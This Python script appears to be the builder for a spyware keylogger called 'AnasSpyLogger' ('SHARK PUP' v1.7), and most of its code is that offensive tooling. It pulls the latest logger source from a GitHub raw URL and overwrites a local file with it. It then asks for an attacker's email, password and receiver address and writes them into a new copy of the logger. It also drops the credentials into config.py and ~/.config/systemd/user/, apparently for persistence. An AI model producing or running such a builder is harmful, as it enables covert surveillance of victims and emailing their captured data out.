# From nothing we make everything
# From nothing we make everything
# From nothing we make everything
# SHARK PUP
# SHARK PUP
# SHARK PUP
# S-PUP
# S-PUP
# S-PUP
# By Anas Labrini


import os
import requests
from tool import anasspylogger

# رابط التحديث المباشر للسكريبت
update_url = "https://raw.githubusercontent.com/anaslabrini/AnasSpyLogger/refs/heads/main/tool/anasspylogger.py"
target_file = "tool/anasspylogger.py"  # الملف المستهدف للتحديث


def clear_screen():
    if os.name == "posix":
        os.system("clear")
    elif os.name == "nt":
        os.system("cls")

clear_screen()

print("[*] Checking for updates...")

try:
    response = requests.get(update_url, timeout=10)
    if response.status_code == 200:
        with open(target_file, 'w') as f:
            f.write(response.text)
        print("[+] Script content updated successfully.")
    else:
        print(f"[-] Failed to download update. Status Code: {response.status_code}")

except requests.exceptions.RequestException as e:
    print(f"[-] Update error: {e}")


print("""
\033[91m	                      m516$9#\033[0m#$$8=m
\033[91m	                    +88$9WWW$\033[0mWWW#8$$$
\033[91m	                   8$9$W$9$$9\033[0mW$WWW$WW9W,
\033[91m	                  799999W$WW$\033[0m$$WWW$$#W$WW
\033[91m	                 9769$$99W$$W\033[0m$$9@#W#WW#W98
\033[91m	                .46899$9$W$W9\033[0mW#W##WWW$WWW8=
\033[91m	               ..57799W$9$9W#\033[0mWWW$#$WW$#9$96.
\033[91m	               ..59$899WW$W$$\033[0m#8##$W$9$W$$999
\033[91m	               36545898$9WW9$\033[0m$W9$WW9WW$$97696
\033[91m	              .334779$WW$$$9W\033[0m$W$$W$W$$W$$9490
\033[91m	               852889999$8W$9\033[0m$$W#W$$WW$$$94$
\033[91m	                7648899$#WW$9\033[0m9$W9W$$W$9$858,
\033[91m	                 41689$$$$9$$\033[0mW9$$$$$$$W978=
\033[91m	                  .57$W8$9$$9\033[0mW$$WWWW$998=
\033[91m	                   17$W9$$$$W\033[0m9$W$$9$W998
\033[91m	                    96799W9W$\033[0m9$WW9W8$88
\033[91m	                     47799W9#\033[0m$WW$WW$92
\033[91m	                     45?68$7W\033[0m$9$999488
\033[91m	                     57646658\033[0m8$9877999
\033[91m	                    ;46875787\033[0m777$9$W98+.
\033[91m	                  .4678777785\033[0m798$87WW$$7.
\033[91m	              .-9988798778869\033[0m99$9$$9$$8$W98;.
\033[91m	          .688$9889$989788999\033[0m98999$$$$$$$$W88899,.
\033[91m	      ,8789999999$9$8989$89W9\033[0m899$9$8$9$$$$$W$$$89WW9;
\033[91m	     77$999778$8899W8W$W$999W\033[0m9$#$9WW9W99WWW99$9$9$W9W76
\033[91m	    788888898$999989789888899\033[0m8$$WW9$99$99$$$$$9$9$W$W98=
\033[91m	   6778898889$$998888W$$8899W\033[0m9#$$$W#WW$WW$$W$$$$$$$$#$88.
\033[91m           __       \033[0m__          __  
\033[91m	  (    __  /__\033[0m)  /  /  /__) 
\033[91m	 __)      /     \033[0m(__/  /                          

\033[91m      SHARK PUP Tool by Anas Labrini - v1.7 
\033[0m
""")

try:
    input_email = input("Enter the email address: ")
    input_password = input("Enter the email password: ")
    input_receiver = input("Enter the receiver email: ")
    output_filename = input("Enter the output filename (without .py extension): ") + ".py"

    if not ("@" in input_email and "." in input_email):
        raise ValueError("[-] Invalid email address.")
    if not input_password:
        raise ValueError("[-] Password cannot be empty.")
    if not ("@" in input_receiver and "." in input_receiver):
        raise ValueError("[-] Invalid receiver email.")

    # الملف الرئيسي للسكربت
    input_file = "tool/anasspylogger.py"

    with open(input_file, "r") as file:
        content = file.read()

    # تعديل القيم
    content = content.replace('EMAIL_ADDRESS = "default_email"', f'EMAIL_ADDRESS = "{input_email}"')
    content = content.replace('EMAIL_PASSWORD = "default_password"', f'EMAIL_PASSWORD = "{input_password}"')
    content = content.replace('TO_EMAIL = "default_receiver"', f'TO_EMAIL = "{input_receiver}"')

    # حفظ النسخة المعدلة
    with open(output_filename, "w") as output_file:
        output_file.write(content)

    # إنشاء ملف config.py في النسخة الجديدة
    with open("config.py", "w") as config_file:
        config_file.write(f"EMAIL_ADDRESS = '{input_email}'\nEMAIL_PASSWORD = '{input_password}'\nTO_EMAIL = '{input_receiver}'")

    # حفظ نسخة في مجلد ~/.config/systemd/user/
    systemd_path = os.path.expanduser("~/.config/systemd/user/")
    os.makedirs(systemd_path, exist_ok=True)
    with open(os.path.join(systemd_path, "config.py"), "w") as systemd_file:
        systemd_file.write(f"EMAIL_ADDRESS = '{input_email}'\nEMAIL_PASSWORD = '{input_password}'\nTO_EMAIL = '{input_receiver}'")

    print(f"[+] The modified file has been saved as {output_filename}")


except FileNotFoundError:
    print("[-] The specified file was not found.")
except ValueError as ve:
    print(f"[-] Error: {ve}")
except Exception as e:
    print(f"[-] An unexpected error occurred: {e}")
